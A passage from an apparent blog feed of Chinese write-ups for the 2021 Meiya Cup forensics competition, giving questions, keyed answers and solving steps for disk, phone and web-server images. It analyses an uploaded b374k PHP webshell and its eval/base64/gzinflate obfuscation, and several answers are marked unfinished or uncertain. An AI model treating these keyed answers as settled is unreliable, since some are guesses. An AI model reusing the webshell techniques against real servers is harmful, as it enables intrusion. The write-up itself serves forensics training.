Logical Volume）设定的名字？（2分）</p><p><strong>A. swap</strong></p><p><strong>B. root</strong></p><p>C. va</p><p><strong>D. home</strong></p></blockquote><p>逻辑卷包括这三个</p><img src="/images/meiya-2021-03/79.png" alt="image-79" style="zoom:67%;" /><br><h2 id="99此Linux计算机曾用挖矿程式”T-Rex”-在相关脚本-script-中哪个是工人-worker-的名称"><a href="#99此Linux计算机曾用挖矿程式”T-Rex”-在相关脚本-script-中哪个是工人-worker-的名称" class="headerlink" title="99此Linux计算机曾用挖矿程式”T-Rex”,在相关脚本(script)中哪个是工人(worker)的名称"></a>99此Linux计算机曾用挖矿程式”T-Rex”,在相关脚本(script)中哪个是工人(worker)的名称</h2><blockquote><p>【单选题】常威Linux计算机曾试用挖矿程式”T-Rex”，在相关脚本 (script)中哪个是工人(worker)的名称？（1分）</p><p>A. stratum</p><p><strong>B. rigo</strong></p><p>C. ethash</p><p>D.E3656251402537151304ceba7c7D9dFoc7E82986100.</p></blockquote><p>待补充</p><br><h2 id="100哪个是exFAT的磁盘分区类型编号"><a href="#100哪个是exFAT的磁盘分区类型编号" class="headerlink" title="100哪个是exFAT的磁盘分区类型编号"></a>100哪个是exFAT的磁盘分区类型编号</h2><blockquote><p>【填空题】LINUX系统中利用fdisk指令下，下列哪一个是”exFAT”的磁盘分区类型编号（ Partition type id）？（请以英文全大写及阿拉伯数字回答）（1分）</p></blockquote><p>待补充</p><br><h2 id="101哪个指令用于激活扫描到的卷组-VolumeGroup"><a href="#101哪个指令用于激活扫描到的卷组-VolumeGroup" class="headerlink" title="101哪个指令用于激活扫描到的卷组(VolumeGroup)"></a>101哪个指令用于激活扫描到的卷组(VolumeGroup)</h2><blockquote><p>【单选题】在Linux的环境下，以下哪一个指令用于激活扫描到的卷组（Volume group）（1分）</p><p>A. vgscan</p><p><strong>B. vgchange</strong></p><p>C. display</p><p>D. vgactive</p></blockquote><ul><li><p><code>vgscan</code>指令查找系统中存在的LVM卷组，并显示找到的卷组列表。</p></li><li><p><code>vgchange</code>指令用于修改卷组的属性，<strong>经常被用来设置卷组是处于活动状态或者非活动状态</strong>。</p></li><li><p><code>display\vgactive</code>没有搜索到和卷组相关的命令</p></li></ul><br><h2 id="102哪一个指令用于删除内有档案的文件夹"><a href="#102哪一个指令用于删除内有档案的文件夹" class="headerlink" title="102哪一个指令用于删除内有档案的文件夹"></a>102哪一个指令用于删除内有档案的文件夹</h2><blockquote><p>【单选题】在 Linux的环境下，下列哪—个指令可以删除内有档案的文件夹？（1分）</p><p>A. rm-d</p><p>B. rm-r</p><p>C. rm -rd</p><p><strong>D. rm-rf</strong></p></blockquote><p>常识题</p><br><h2 id="103常威Linux的Logical-Volume路径-“vg-x2F-home”使用了甚么系统建立"><a href="#103常威Linux的Logical-Volume路径-“vg-x2F-home”使用了甚么系统建立" class="headerlink" title="103常威Linux的Logical Volume路径 “vg&#x2F;home”使用了甚么系统建立"></a>103常威Linux的Logical Volume路径 “vg&#x2F;home”使用了甚么系统建立</h2><p>使用lvdiskplay命令来查看</p><p>待补充</p><br><h2 id="104常威Linux的Logical-Volume路径-“vg-x2F-home”的CurrentLE是什么"><a href="#104常威Linux的Logical-Volume路径-“vg-x2F-home”的CurrentLE是什么" class="headerlink" title="104常威Linux的Logical Volume路径 “vg&#x2F;home”的CurrentLE是什么"></a>104常威Linux的Logical Volume路径 “vg&#x2F;home”的CurrentLE是什么</h2><p>使用lvdiskplay命令来查看</p><p>待补充</p><br><h2 id="105常威Linux的Volume-group的TotalPE是什么"><a href="#105常威Linux的Volume-group的TotalPE是什么" class="headerlink" title="105常威Linux的Volume group的TotalPE是什么"></a>105常威Linux的Volume group的TotalPE是什么</h2><p>使用lvdiskplay命令来查看</p><p>待补充</p>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
          <category> 比赛 </category>
          
          <category> 2021美亚杯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021美亚杯_团队赛上</title>
      <link href="/post/71007601.html"/>
      <url>/post/71007601.html</url>
      
        <content type="html"><![CDATA[<h1 id="PART1工地员工staffA-staffB的计算机"><a href="#PART1工地员工staffA-staffB的计算机" class="headerlink" title="PART1工地员工staffA,staffB的计算机"></a>PART1工地员工staffA,staffB的计算机</h1><p>根据整体案情,这两台电脑应该是<a href="51090d68.html">个人赛(见第7题)</a>中,和工地主管的电脑一起被BitLocker锁住的另外两个员工的电脑</p><p>在分析<a href="51090d68.html">个人赛(Alex的FTP服务器)</a>时,曾找到过两个BitLocker密钥文件,可以用来解锁这俩电脑的磁盘</p><p><img src="/images/meiya-2021-02/image-20220810185940477.png" alt="image-20220810185940477"></p><h2 id="1工地职员-A-计算机的修复密钥标识符"><a href="#1工地职员-A-计算机的修复密钥标识符" class="headerlink" title="1工地职员 A 计算机的修复密钥标识符"></a>1工地职员 A 计算机的修复密钥标识符</h2><p>使用取证大师加载staffA镜像后,右键被加密的磁盘-<code>BitLocker解密</code>就能看见</p><img src="/images/meiya-2021-02/image-20220810190128802.png" alt="image-20220810190128802" style="zoom:67%;" /><br><h2 id="2工地职员-A-计算机的修复密钥"><a href="#2工地职员-A-计算机的修复密钥" class="headerlink" title="2工地职员 A 计算机的修复密钥"></a>2工地职员 A 计算机的修复密钥</h2><p>就是从Alex的FTP服务器里找到的那个</p><br><h2 id="3工地职员-A的计算机被什么程式加密"><a href="#3工地职员-A的计算机被什么程式加密" class="headerlink" title="3工地职员 A的计算机被什么程式加密"></a>3工地职员 A的计算机被什么程式加密</h2><blockquote><p>【单选题】工地职员 A的计算机被什么程式密?(1分)</p><p>A.Ransomware</p><p><strong>B.BitLocker</strong></p><p>C.AxCrypt</p><p>D.PGP</p><p>E.FileVault 2</p></blockquote><p>这个很显然是BitLocker了</p><br><h2 id="4工地职员A的孩子有可能正准备就读什么学校"><a href="#4工地职员A的孩子有可能正准备就读什么学校" class="headerlink" title="4工地职员A的孩子有可能正准备就读什么学校"></a>4工地职员A的孩子有可能正准备就读什么学校</h2><blockquote><p>【单选题】工地职员A的孩子有可能正准备就读什么学校?(2分)</p><p>A.小学</p><p>B.中学</p><p><strong>C.幼儿园</strong></p><p>D.大学</p></blockquote><p>这题要根据从staffA电脑中找到的信息来判断了</p><p>浏览记录里可以发现一个幼儿园的入学申请:</p><img src="/images/meiya-2021-02/image-20220810190517188.png" alt="image-20220810190517188" style="zoom:67%;" /><br><h2 id="5工地职员A并没有打开过哪一个档案"><a href="#5工地职员A并没有打开过哪一个档案" class="headerlink" title="5工地职员A并没有打开过哪一个档案"></a>5工地职员A并没有打开过哪一个档案</h2><blockquote><p>【多选题】工地职员A并没有打开过那一个档案?(2分)</p><p><strong>A.Staff3.xlsx</strong></p><p><strong>B.Staf4.xisx</strong></p><p><strong>C.Slaf1. xisx</strong></p><p><strong>D.Staf2.xisx</strong></p><p>E.BTC address.bmp</p></blockquote><p>去<code>用户痕迹</code>-<code>最近访问记录</code>-<code>最近访问的文档</code>里依次对照选项</p><img src="/images/meiya-2021-02/image-20220810190700606.png" alt="image-20220810190700606" style="zoom:67%;" /><br><h2 id="6工地现员-A-的计算机被远程控制了多少分钟"><a href="#6工地现员-A-的计算机被远程控制了多少分钟" class="headerlink" title="6工地现员 A 的计算机被远程控制了多少分钟"></a>6工地现员 A 的计算机被远程控制了多少分钟</h2><p>根据开始和结束时间计算:</p><img src="/images/meiya-2021-02/image-20220810190746627.png" alt="image-20220810190746627" style="zoom:67%;" /><br><h2 id="7工地职员-A-的计算机被加密后-被要求存入何种虚拟货币"><a href="#7工地职员-A-的计算机被加密后-被要求存入何种虚拟货币" class="headerlink" title="7工地职员 A 的计算机被加密后,被要求存入何种虚拟货币"></a>7工地职员 A 的计算机被加密后,被要求存入何种虚拟货币</h2><blockquote><p>【单选题】工地职员 A 的计算机被加密后,被要求存入的虚拟货币是什么?(1分)</p><p>  A  比币现金</p><p>  <strong>B 比特币</strong></p><p>  C 以太币</p><p>  D 达币</p></blockquote><p>这题根据前面已经掌握的信息也已经很明显了(<strong>例如工地主管和Alex的WhatsApp聊天记录</strong>)</p><p>仿真进去看桌面上的信息也能知道:</p><img src="/images/meiya-2021-02/image-20220810190934533.png" alt="image-20220810190934533" style="zoom:67%;" /><br><h2 id="8在工地职员-A-的计算机曾经打开过的-Excal-档案中-多少人有可能在法律部门工作"><a href="#8在工地职员-A-的计算机曾经打开过的-Excal-档案中-多少人有可能在法律部门工作" class="headerlink" title="8在工地职员 A 的计算机曾经打开过的 Excal 档案中,多少人有可能在法律部门工作"></a>8在工地职员 A 的计算机曾经打开过的 Excal 档案中,多少人有可能在法律部门工作</h2><p>文档访问记录中显示staff1.xlsx被打开过.导出它,然后筛选出**legal,**共22个记录</p><img src="/images/meiya-2021-02/image-20220810191055023.png" alt="image-20220810191055023" style="zoom:67%;" /><br><h2 id="9工地职员B的计算机在什么日期和时间被黑客控制"><a href="#9工地职员B的计算机在什么日期和时间被黑客控制" class="headerlink" title="9工地职员B的计算机在什么日期和时间被黑客控制"></a>9工地职员B的计算机在什么日期和时间被黑客控制</h2><blockquote><p>【多选题】工地职员B的计算机在什么日期和时间被黑客控制?(2分)</p><p>A .2021—10—19</p><p>B .2021—09—16</p><p>C .11:16:41(UTC + 8:00)</p><p>D .05:55:50(UTC + 8:00)</p><p><strong>E . 18:40:06(UTC +8:00)</strong></p></blockquote><p>使用取证大师加载staffB镜像,自动取证后同样去找其被teamviewer连接的记录:</p><p>好像只有E项在该范围里</p><img src="/images/meiya-2021-02/image-20220810191241014.png" alt="image-20220810191241014" style="zoom:67%;" /><br><h2 id="10工地职员-B-的计算机的MAC-Address"><a href="#10工地职员-B-的计算机的MAC-Address" class="headerlink" title="10工地职员 B 的计算机的MAC Address"></a>10工地职员 B 的计算机的MAC Address</h2><p>自动取证结果里有:</p><img src="/images/meiya-2021-02/image-20220810191356933.png" alt="image-20220810191356933" style="zoom:67%;" /><br><h2 id="11工地职员-B-的计算机户FaFa的Profile-ID-是什么"><a href="#11工地职员-B-的计算机户FaFa的Profile-ID-是什么" class="headerlink" title="11工地职员 B 的计算机户FaFa的Profile ID 是什么"></a>11工地职员 B 的计算机户FaFa的Profile ID 是什么</h2><p>自动取证结果里有:</p><img src="/images/meiya-2021-02/image-20220810191619720.png" alt="image-20220810191619720" style="zoom:67%;" /><br><h2 id="12工地职员B办公室计算机的-Windows-CD-Key"><a href="#12工地职员B办公室计算机的-Windows-CD-Key" class="headerlink" title="12工地职员B办公室计算机的 Windows CD Key"></a>12工地职员B办公室计算机的 Windows CD Key</h2><p>仿真起来后 <code>win+r</code> +  <code>regedit.exe</code>进入<strong>注册表</strong></p><p><code>windows cd key</code>的路径是:<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\SoftwareProtectionPlatform\BackupProductKeyDefault</code></p><img src="/images/meiya-2021-02/image-20220810191812491.png" alt="image-20220810191812491" style="zoom:67%;" /><br><h2 id="13检查过工地职员-B-的计算机登录档案后-计算机感染了什么恶意软件"><a href="#13检查过工地职员-B-的计算机登录档案后-计算机感染了什么恶意软件" class="headerlink" title="13检查过工地职员 B 的计算机登录档案后,计算机感染了什么恶意软件"></a>13检查过工地职员 B 的计算机登录档案后,计算机感染了什么恶意软件</h2><blockquote><p>【单选题】检查过工地职员 B 的计算机登录档案后( Wndow Registry )，计算机感染了什么恶意软件?(1分)</p><p>A . Adware</p><p>B . Worms</p><p>C . Rootkits</p><p><strong>D .没有感染任何恶意软件</strong></p></blockquote><p>这个好像仿真起来之后,用火绒之类的软件扫描一下?</p><br><h2 id="14工地职员-B-的计算机中被加密分区内的图片-120778782-58759559-jpg有可能是从何途径载入计算机"><a href="#14工地职员-B-的计算机中被加密分区内的图片-120778782-58759559-jpg有可能是从何途径载入计算机" class="headerlink" title="14工地职员 B 的计算机中被加密分区内的图片_120778782_58759559.jpg有可能是从何途径载入计算机"></a>14工地职员 B 的计算机中被加密分区内的图片_120778782_58759559.jpg有可能是从何途径载入计算机</h2><blockquote><p>【单选题】工地职员 B 的计算机中被加密便盘内的图片”_120778782_58759559.jpg”,有可能是从下列哪个途径载入计算机？</p><p>A .电邮下载附件</p><p>B . USB</p><p><strong>C . 网上下载</strong></p><p>D . 蓝牙传入</p><p>E . Direct-Link</p></blockquote><p>使用BitLocker解密分区后,找到这张图片:</p><img src="/images/meiya-2021-02/image-20220810193051134.png" alt="image-20220810193051134" style="zoom:67%;" /><p>从浏览器的下载记录中也能够找到对应的记录:</p><img src="/images/meiya-2021-02/image-20220810193135088.png" alt="image-20220810193135088" style="zoom:67%;" /><br><h2 id="15工地职员B的计算机中被加密硬盘内的图片中-人物穿着有什么颜色"><a href="#15工地职员B的计算机中被加密硬盘内的图片中-人物穿着有什么颜色" class="headerlink" title="15工地职员B的计算机中被加密硬盘内的图片中,人物穿着有什么颜色"></a>15工地职员B的计算机中被加密硬盘内的图片中,人物穿着有什么颜色</h2><blockquote><p>【多选题】工地职员B的计算机中被加密硬盘内的图片中,人物中农着有什么颜色?(2分)</p><p>A . 黄色</p><p><strong>B .红色</strong></p><p>C .紫色</p><p>D . 蓝色</p><p><strong>E . 绿色</strong></p></blockquote><p>这都什么奇奇怪怪的题…</p><p>从该分区内查看下图片就行了:</p><img src="/images/meiya-2021-02/image-20220810193426764.png" alt="image-20220810193426764" style="zoom:67%;" /><br><h2 id="16工地职员-B-的计算机有多个磁盘分区"><a href="#16工地职员-B-的计算机有多个磁盘分区" class="headerlink" title="16工地职员 B 的计算机有多个磁盘分区"></a>16工地职员 B 的计算机有多个磁盘分区</h2><p>直接数数有5个</p><img src="/images/meiya-2021-02/image-20220810194014000.png" alt="image-20220810194014000" style="zoom:67%;" /><br><h2 id="17工地职员B的计算机硬盘分割表是什么"><a href="#17工地职员B的计算机硬盘分割表是什么" class="headerlink" title="17工地职员B的计算机硬盘分割表是什么"></a>17工地职员B的计算机硬盘分割表是什么</h2><p>仿真起来后,安装vmtool,然后把<code>diskgenius</code>软件拖进去打开,可以看到硬盘分割表类型</p><img src="/images/meiya-2021-02/image-20220810194323056.png" alt="image-20220810194323056" style="zoom:67%;" /><br><h2 id="18工地职员B的计算机EventLog中最后登入时services-exe的Prccess-ID"><a href="#18工地职员B的计算机EventLog中最后登入时services-exe的Prccess-ID" class="headerlink" title="18工地职员B的计算机EventLog中最后登入时services .exe的Prccess ID"></a>18工地职员B的计算机EventLog中最后登入时services .exe的Prccess ID</h2><p>在日志中,在<code>描述</code>列中筛选<code>service.exe</code>,在<code>分类</code>列中筛选<code>登录</code></p><p>然后找到最近的一项,下面可以看到<code>Pross ID</code>为1833</p><p><img src="/images/meiya-2021-02/111.png" alt="image-111"></p><br><hr><br><h1 id="PART2元材原料网页服务器"><a href="#PART2元材原料网页服务器" class="headerlink" title="PART2元材原料网页服务器"></a>PART2元材原料网页服务器</h1><h2 id="19什么IP曾经上传档案到网页服务器"><a href="#19什么IP曾经上传档案到网页服务器" class="headerlink" title="19什么IP曾经上传档案到网页服务器"></a>19什么IP曾经上传档案到网页服务器</h2><p>这是一台windows系统的网站服务器</p><p>查看<code>apache</code>日志,过滤访问方式<code>POST</code>,可以发现<code>203.145.94.120</code>多次以POST的方式访问上传功能(<code>uploader.php</code>)</p><p><img src="/images/meiya-2021-02/2.png" alt="image-2"></p><br><h2 id="20接上题-以下哪些档案曾被上传到网页服务器"><a href="#20接上题-以下哪些档案曾被上传到网页服务器" class="headerlink" title="20接上题,以下哪些档案曾被上传到网页服务器"></a>20接上题,以下哪些档案曾被上传到网页服务器</h2><blockquote><p>【多选题】承上题,以下哪些档案曾被上传到网页服务器?(3分)</p><p><strong>A .kjk2.jpg</strong></p><p><strong>B kjk2.php</strong></p><p>C b6778k-9.0.php</p><p><strong>D b374k-2.5.php</strong></p><p>E d374k-2.5.php</p></blockquote><p>在203.145.94.120的访问记录中首先可以发现一个名为<code>b374k-2.5.php</code>的文件被多次执行</p><p>且这个脚本被执行之前,先多次执行了<code>upload</code>功能,因此可以推测<strong>之前是在将这个脚本文件上传到服务器</strong></p><p>进一步取消对<code>POST</code>的筛选,按照时间线来看:</p><p><img src="/images/meiya-2021-02/3.png" alt="image-3"></p><p>这里执行一次<code>upload</code>后,就<code>get</code>方式访问<code>kjk2.jpg</code>,接着又执行一次<code>upload</code>后,get访问<code>kjk2.php</code></p><p>找到<code>kjk2.php</code>这个文件,发现它确实是一张图片</p><img src="/images/meiya-2021-02/4.png" alt="image-4" style="zoom:67%;" /><p>这里可以猜测上传者修改了<code>kjk2.jpg</code>的扩展名为<code>php</code>来<strong>试探</strong>服务器后端是否存在<strong>针对文件类型的上传过滤</strong></p><p>在确认不存在<strong>针对文件类型的上传过滤后</strong>,上传者上传了<code>b374k-2.5.php</code></p><p>然后多次通过<code>post</code>的方式访问它,那么这个<code>b374k-2.5.php</code>应该就是执行攻击的脚本了</p><br><h2 id="21入侵者可能使用什么漏洞入侵网页服务器"><a href="#21入侵者可能使用什么漏洞入侵网页服务器" class="headerlink" title="21入侵者可能使用什么漏洞入侵网页服务器"></a>21入侵者可能使用什么漏洞入侵网页服务器</h2><blockquote><p>【单选题】入侵者可能使用甚么漏洞进行入侵网页服务器?(1分)</p><p><strong>A .文件上传漏洞</strong></p><p>B SQL 注入</p><p>C 跨站脚本攻击</p><p>D 格式化字将串弱点</p></blockquote><p>上一题得知是通过上传脚本并执行来实现攻击</p><p>那么就是文件上传漏洞</p><br><h2 id="22在网页服务器得到的所有文件档-doc-及-doex-中-有哪些作者"><a href="#22在网页服务器得到的所有文件档-doc-及-doex-中-有哪些作者" class="headerlink" title="22在网页服务器得到的所有文件档( doc 及 doex )中,有哪些作者"></a>22在网页服务器得到的所有文件档( doc 及 doex )中,有哪些作者</h2><blockquote><p>【多选题】在网页服务器得到的所有文件档( doc 及 doex )中,有以下哪些文件制作人(Author) ?(2分)</p><p><strong>A. Kevin L.Brown</strong></p><p>B Peter R.Lee </p><p><strong>C Mary</strong></p><p>D May</p><p>E Colin</p></blockquote><p>这题可以使用取证大师小程序-<code>office文档元数据解析</code>来完成</p><img src="/images/meiya-2021-02/5.png" alt="image-5" style="zoom:67%;" /><br><h2 id="23在网页服务器中-哪个是可疑档案-它如何取得计算机控制权"><a href="#23在网页服务器中-哪个是可疑档案-它如何取得计算机控制权" class="headerlink" title="23在网页服务器中,哪个是可疑档案,它如何取得计算机控制权"></a>23在网页服务器中,哪个是可疑档案,它如何取得计算机控制权</h2><blockquote><p>【多选题】在网页服务器中,哪个是可疑档案?它如何获得计算机控制权?(3分)</p><p>A可疑档案:b677Bk—9.0.php</p><p><strong>B可疑档案:b374k—25. php</strong></p><p>C可档案: upload.php</p><p><strong>D透过浏究器远程管理取得计算机控制权</strong></p><p>E透过远程工具PuTTY取得计算机控制权</p></blockquote><p>根据21题已经知道:<code>b374k-2.5.php</code>这个脚本执行了攻击</p><p>将它导出并查看,可以发现<code>eval</code>这个<strong>一句话木马</strong>关键字</p><img src="/images/meiya-2021-02/6.png" alt="image-6" style="zoom:67%;" /><p>而且前面的注释中给了网址,这个脚本应该不是私人编写的</p><img src="/images/meiya-2021-02/7.png" alt="image-7" style="zoom:67%;" /><p>那么这里就可以明确:</p><p>攻击者通过<code>upload</code>功能上传了b374k这个脚本文件,并使用浏览器通过此脚本实现远程控制</p><br><h2 id="24在网页服务器中-运行可疑档案需要密码-其密码的哈希值是甚么"><a href="#24在网页服务器中-运行可疑档案需要密码-其密码的哈希值是甚么" class="headerlink" title="24在网页服务器中,运行可疑档案需要密码,其密码的哈希值是甚么"></a>24在网页服务器中,运行可疑档案需要密码,其密码的哈希值是甚么</h2><p>这里在<code>b374k-2.5.php</code>这个脚本的源码中也给出来了</p><img src="/images/meiya-2021-02/6.png" alt="image-6" style="zoom:67%;" /><p>这里的注释已经说明了,<code>s_pass</code>这个变量为密码的<code>md5</code>哈希值</p><br><h2 id="25在网页服务器中，可疑档案的译码函数是什么"><a href="#25在网页服务器中，可疑档案的译码函数是什么" class="headerlink" title="25在网页服务器中，可疑档案的译码函数是什么"></a>25在网页服务器中，可疑档案的译码函数是什么</h2><blockquote><p>【单选题】在网特服务器中，可疑档案的译码函数是什么？（2分）</p><p>A . unzip _ file (‘$x,$y’)</p><p>B . gzdccode(base64_decode($x))</p><p>C . gzinflate(base64_ decode($x))</p><p>D .以上皆否</p></blockquote><p>参照<code>eval</code>的拼接方式,这里应该是为了<strong>绕过一些敏感函数的检测</strong></p><p>可以看到后面拼接起来的这个函数是 <code>gzinflate</code>, 后面的参数里有个拼接起来的<code>decode</code>,也可以说明这个是译码函数</p><img src="/images/meiya-2021-02/8.png" alt="image-8" style="zoom:67%;" /><p>通过分析上面的代码可知:</p><p>脚本本身是通过<code>eval</code>来执行<code>gzinflate(base64_decode($x))</code>,首先进行<code>base64</code>解码,再通过<code>gzinflate</code>函数来压缩 </p><p>而真正的程序代码是最下面一行那一长串<code>base64</code>码,它们被解码之后才能发挥作用</p><br><h2 id="26解压后的脚本文档的档案大小是多少"><a href="#26解压后的脚本文档的档案大小是多少" class="headerlink" title="26解压后的脚本文档的档案大小是多少"></a>26解压后的脚本文档的档案大小是多少</h2><p>为了得到源码,最简单的办法就是将上述功能再执行一遍,得到真正的脚本代码</p><p>可以使用取证大师里的开发模式写一个简单的解压脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> forensics <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_debug</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    启用调试功能，此函数不要修改</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    mydebug.start_debug()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gzinflate_base64_de</span>(<span class="params">str_base64</span>):</span><br><span class="line">    compressed_data = base64.b64decode(str_base64) <span class="comment"># 先对原数据进行base64解码</span></span><br><span class="line">    <span class="keyword">return</span> zlib.decompress(compressed_data, -<span class="number">15</span>) <span class="comment"># 再对解码后的数据进行压缩,相当于php文件中的gzinflate函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line"></span><br><span class="line">    str_base64 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    这里放待解压的脚本代码</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    real_data = gzinflate_base64_de(str_base64)</span><br><span class="line">    <span class="comment"># 将解码后的脚本文件写入txt文件中</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;E:/decode_temp.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(real_data)</span><br></pre></td></tr></table></figure><p>解压后得到了可阅读的<code>php</code>脚本文件:</p><img src="/images/meiya-2021-02/9.png" alt="image-9" style="zoom:67%;" /><p>查看大小为<strong>109041</strong>字节</p><img src="/images/meiya-2021-02/10.png" alt="image-10" style="zoom:67%;" /><br><h2 id="27解压后的脚本文件内有甚么功能"><a href="#27解压后的脚本文件内有甚么功能" class="headerlink" title="27解压后的脚本文件内有甚么功能"></a>27解压后的脚本文件内有甚么功能</h2><blockquote><p>【多选题】解压后的脚本文件内有甚么功能?(3分)</p><p><strong>A 编辑文件</strong></p><p><strong>B 删除文件</strong></p><p>C 更改用户密码</p><p>D .加密文件</p><p><strong>E .重新命名文件</strong></p></blockquote><p>根据23题,在网上就可以搜索到b374k脚本的功能:</p><img src="/images/meiya-2021-02/11.png" alt="image-11" style="zoom:67%;" /><br><h2 id="28解压后的脚本含有压缩功能-当中使用的解压方法是甚么"><a href="#28解压后的脚本含有压缩功能-当中使用的解压方法是甚么" class="headerlink" title="28解压后的脚本含有压缩功能,当中使用的解压方法是甚么"></a>28解压后的脚本含有压缩功能,当中使用的解压方法是甚么</h2><blockquote><p>【单选题】解压后的脚本含有压缩功能,当中使用的解压方法是甚么?(2分)</p><p>A. PclZip . php</p><p>B Unzip _gz()</p><p><strong>C ZipArchive()</strong></p><p>D 以上皆否</p></blockquote><p>累了,直接在解压后的脚本里搜选项:</p><img src="/images/meiya-2021-02/12.png" alt="image-12" style="zoom:67%;" /><br><hr><br><h1 id="PART3特普手机"><a href="#PART3特普手机" class="headerlink" title="PART3特普手机"></a>PART3特普手机</h1><h2 id="29特普电话中一张照片包含哪些文字"><a href="#29特普电话中一张照片包含哪些文字" class="headerlink" title="29特普电话中一张照片包含哪些文字"></a>29特普电话中一张照片包含哪些文字</h2><blockquote><p>【多选题】特普的电话中一张于2021年09月30日10:45:12拍摄的相片包含以哪些字?(1分)</p><p>A 精忠</p><p>B 报国</p><p><strong>C 忠诚</strong> </p><p><strong>D 勇毅</strong></p></blockquote><p>根据时间过滤出这张图片,发现是一张二维码</p><img src="/images/meiya-2021-02/13.png" alt="image-13" style="zoom: 67%;" /><p>使用网上的解码平台解码:</p><img src="/images/meiya-2021-02/14.png" alt="image-14" style="zoom: 67%;" /><br><h2 id="30特普电话中有哪些其他人的WhatsApp用户数据记录"><a href="#30特普电话中有哪些其他人的WhatsApp用户数据记录" class="headerlink" title="30特普电话中有哪些其他人的WhatsApp用户数据记录"></a>30特普电话中有哪些其他人的WhatsApp用户数据记录</h2><blockquote><p>【多选题】特普的电电话中的 whatsapp 账号<a href="mailto:&#56;&#53;&#50;&#54;&#56;&#x34;&#x32;&#x31;&#52;&#57;&#x35;&#64;&#x36;&#46;&#119;&#104;&#x61;&#116;&#x73;&#x61;&#112;&#x70;&#x2e;&#110;&#x65;&#116;">&#56;&#53;&#50;&#54;&#56;&#x34;&#x32;&#x31;&#52;&#57;&#x35;&#64;&#x36;&#46;&#119;&#104;&#x61;&#116;&#x73;&#x61;&#112;&#x70;&#x2e;&#110;&#x65;&#116;</a>中,有哪些其他人的WhatsApp 用户数据记录？（2分）AD</p><p>A .85222117188@ s.whatsapp.net</p><p>B .85289853825@ s.whatsapp.net</p><p>C .85264795287@ s.whatsapp.net</p><p>D .85231882226@ s.whatsapp.net</p></blockquote><p>从分析结果中找不到上述记录,但是可以定位WhatsApp的数据库路径:</p><img src="/images/meiya-2021-02/15.png" alt="image-15" style="zoom: 67%;" /><p>在数据库里可以找到存储的联系人:</p><img src="/images/meiya-2021-02/16.png" alt="image-16" style="zoom: 67%;" /><br><h2 id="31特普于经纬度22-278843-114-165783没有做什么"><a href="#31特普于经纬度22-278843-114-165783没有做什么" class="headerlink" title="31特普于经纬度22.278843,114.165783没有做什么"></a>31特普于经纬度22.278843,114.165783没有做什么</h2><blockquote><p>【多选题】特普于经纬度22.278843,114.165783,没有做什么?(2分)</p><p><strong>A 拍影片</strong></p><p>B拍照</p><p><strong>C 使用 google map</strong></p><p><strong>D .在 Whatsapp 中分享实时位置</strong></p></blockquote><p>在位置一栏中找到题目中的坐标,发现这个坐标来自于拍摄的照片</p><p>那么没有做的事就是另外三项</p><img src="/images/meiya-2021-02/17.png" alt="image-17" style="zoom: 67%;" /><br><h2 id="32特普电话的热点分享密码"><a href="#32特普电话的热点分享密码" class="headerlink" title="32特普电话的热点分享密码"></a>32特普电话的热点分享密码</h2><blockquote><p>【单选题】特普电话的热点分享密码是什么?(1分)</p><p>A .12345678</p><p>B .69447401bceb</p><p>C .Jioijo4542554</p><p>D . Dak Pou Home</p></blockquote><p>安卓系统的热点信息存储位置:<code>USERDATA分区/misc/wifi/softap.conf</code></p><p>找到这个文件查看即可:</p><img src="/images/meiya-2021-02/18.png" alt="image-18" style="zoom: 67%;" /><br><h2 id="33特普于电话中安装了一个可疑软件-其安装包的描述哪些正确"><a href="#33特普于电话中安装了一个可疑软件-其安装包的描述哪些正确" class="headerlink" title="33特普于电话中安装了一个可疑软件,其安装包的描述哪些正确"></a>33特普于电话中安装了一个可疑软件,其安装包的描述哪些正确</h2><blockquote><p>【多选题】特普于电话中安装了一个可疑软件（版本为2020033001），跟据该可疑软件的安装档,下列哪项描述正确?(2分)</p><p><strong>A 软件名称是安全防护</strong></p><p>B 软件名称是安心润家</p><p>C .软件签名( signAlgorithm )以SHA512withRSA加密</p><p>D .封包名称(packageName)是org.chromium.webapk .a5b80edf82b436506_v2</p></blockquote><p>通过题目中给的版本号来过滤出这个apk文件:</p><img src="/images/meiya-2021-02/19.png" alt="image-19" style="zoom: 67%;" /><p>导出后使用雷电APP分析软件加载:</p><img src="/images/meiya-2021-02/20.png" alt="image-20" style="zoom: 67%;" /><p><img src="/images/meiya-2021-02/image-20220811235451054.png" alt="image-20220811235451054"></p><p>根据得到的信息对照,选项中只有A正确</p><br><h2 id="34该可疑软件安装包涉及哪些权限"><a href="#34该可疑软件安装包涉及哪些权限" class="headerlink" 